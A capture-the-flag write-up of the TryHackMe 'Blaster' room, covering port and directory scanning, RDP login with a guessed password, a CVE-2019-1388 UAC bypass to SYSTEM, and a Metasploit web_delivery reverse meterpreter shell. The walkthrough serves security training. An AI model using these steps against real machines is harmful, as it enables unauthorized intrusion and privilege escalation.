# Blaster
> 4lch3my | June 26, 2023
-------------------
#### A blast from the past!
#### [Room Link](https://tryhackme.com/room/blaster)

## Basic Enumeration 
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>

Now is where the basics of recon comes into play. To start, I use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in agressive mode, so we can follow along with the commands and enumeration.

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-25 22:55 BST
Nmap scan report for ip-MACHINE_IP.eu-west-1.compute.internal (10.10.143.114)
Host is up (0.00030s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2023-06-24T21:50:39
|_Not valid after:  2023-12-24T21:50:39
|_ssl-date: 2023-06-25T21:55:42+00:00; 0s from scanner time.
MAC Address: 02:AD:6F:28:86:81 (Unknown)
...
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 28.98 seconds
```

#### Web Enumeration

On `port 80` we have a webserver running. Before we visit it, let us run a good old [GoBuster](https://www.kali.org/tools/gobuster/) website scan for login pages:
`gobuster dir -u http://10.10.238.240/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.143.114/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/06/25 23:04:02 Starting gobuster
===============================================================
/retro (Status: 301)
/Retro (Status: 301)
===============================================================
2023/06/25 23:04:30 Finished
===============================================================
```

Time to look at both of these pages. After a few minutes of looking at both of them I can safely say, they are an exact copy of each other, so I will be focusing on `/retro` on the rest of the writeup. The webpage presented is as seen below, a blog style website.

IMAGE: retro.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/retro.PNG?raw=true)

It seems to be written in cronological order, so let's scroll to the bottom of the main page, and see who the author might be.

IMAGE: wade.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/wade.PNG?raw=true)

Crawling through the posts, we can find one called `Ready Player One` where he is reffering to an issue with login. 

IMAGE: palyer_one.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/palyer_one.PNG?raw=true)

Clicking the post and reading the comment section, we get a hint at what migth the users password be:

IMAGE: maybe_password.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/maybe_password.PNG?raw=true)

With this info we can try to log in to the machine. Open RDP or Remmina on your host machine, use the provided settings to access it:

IMAGE: remmina.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/remmina.PNG?raw=true)

And we have access! Read the user.txt on the Desktop for the first flag!

## Machine Enumeration 

We see another file on the desktop named `hhupd`. After  quick Google we can see a CVE is usually tested with this file: `CVE-2019-1388`. `CVE-2019-1388` exploits a part of the UAC `Windows Certificate Dialog` popup when a user has no access to an administrator file without a password. 
This is one of the easiest bypasses out there, so time to run over this as fast as possible.

On the Host machine, double-click/run the `hhupd` application. You will get prompted to provide an administrator password. 

IMAGE: admin.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/admin.PNG?raw=true)

As we do not have one, we can try to exploit this. Click the `Show more details` option, then the `Show information about the publisher's certificate`.

IMAGE: certification.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/certification.PNG?raw=true)

After this, click on the `Issued by` URL link, it may seem nothin is happening at first, but it will prompt a browser window to open (Internet Explorer in our case) in the background. Close the `Certification popup` (top right X), close the `User Account Control` popup (top right X), and the mentioned Internet Explorer Windows show be visible.

IMAGE: ie.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/ie.PNG?raw=true)

Don't worry if you get the error: `"This page can't be displayed"`, as the machine has no internet access, this will never load, so you can ignore it!
In the next step, we need to "save the webpage to our machine". Hit `Control+S` to get the following prompt:

IMAGE: ie_2.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/ie_2.PNG?raw=true)

Click `OK`, and save the file to the location: `C:\WINDOWS\system32\cmd.exe`

IMAGE: explorer.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/explorer.PNG?raw=true)

Click `SAVE` and you will notice a CMD prompt windows appear. After writing the command `whoami`, we can see we are `nt authority\system` also knwon as `root`. 
To grab the admin flag, we can visit: `C:\Users\Administrator\Desktop` and get the flag

IMAGE: root_flag.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/root_flag.PNG?raw=true)

## Reverse shell

Time to get a reverse shell from outside of this machine.
Start metasploit with the `msfconsole`. After loading in, we can select our exploit with: `exploit/multi/script/web_delivery`.
To see all target options, we can use the command `show targets`, then use `set target PSH` to select powershell for our use.
Then we can set the `lhost` to our exploiting machine and `lport` to something what we like, I usually use `1337` to be easily visible. 
Then we can set our payload to `set payload windows/meterpreter/reverse_http` to get a reverse http shell. And finally we can run our exploit against the target machine with `run -j`.
You will get a command specially crafted for you from the console, something like this:

IMAGE: metasploit.PNG
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blaster/images/metasploit.PNG?raw=true)

Copy and Paste this to the Windows machine CMD terminal what we opened in the previous task. After you execute it, you will see a session created in your `metasploit console`. To make sure it worked, you can use the `sessions` command to list sessions. To use the session, use the command: `sessions SESSION_NUMBER`.

And there we go. We have a full terminal with `elevated priveledges`.

#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeup's of mine or interested in some of my coding work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my
